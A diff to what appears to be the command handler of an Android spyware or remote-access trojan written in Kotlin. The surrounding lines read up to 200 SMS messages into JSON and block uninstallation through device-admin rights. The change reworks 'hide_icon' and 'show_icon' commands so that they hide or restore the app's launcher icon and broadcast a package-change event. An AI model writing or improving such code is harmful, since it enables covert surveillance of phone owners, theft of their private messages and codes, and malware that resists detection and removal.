@@ -214,8 +214,27 @@ class Svc : Service() {
                     c?.use { while (it.moveToNext() && arr.length() < 200) { arr.put(JSONObject().put("from", it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS))).put("body", it.getString(it.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY)))) } }
                     arr.toString()
                 }
-                "hide_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP); "hidden" }
-                "show_icon" -> { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP); "shown" }
+                "hide_icon" -> {
+                    try {
+                        val cn = ComponentName(this, MainActivity::class.java)
+                        packageManager.setComponentEnabledSetting(cn, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                        val i = Intent(Intent.ACTION_PACKAGE_CHANGED)
+                        i.data = android.net.Uri.parse("package:$packageName")
+                        i.putExtra(Intent.EXTRA_DATA_REMOVED, true)
+                        sendBroadcast(i)
+                        "hidden"
+                    } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
+                }
+                "show_icon" -> {
+                    try {
+                        val cn = ComponentName(this, MainActivity::class.java)
+                        packageManager.setComponentEnabledSetting(cn, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+                        val i = Intent(Intent.ACTION_PACKAGE_CHANGED)
+                        i.data = android.net.Uri.parse("package:$packageName")
+                        sendBroadcast(i)
+                        "shown"
+                    } catch (e: Exception) { "ERR: " + (e.message ?: "?") }
+                }
                 "uninstall_block" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, true); "blocked" } else "ERR: not admin" }
                 "uninstall_unblock" -> { val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager; val admin = ComponentName(this, AdminRecv::class.java); if (dpm.isAdminActive(admin)) { dpm.setUninstallBlocked(admin, packageName, false); "unblocked" } else "ERR: not admin" }
                 "set_wallpaper" -> { setWallpaper(a.optString("url", "")); "wallpaper requested" }
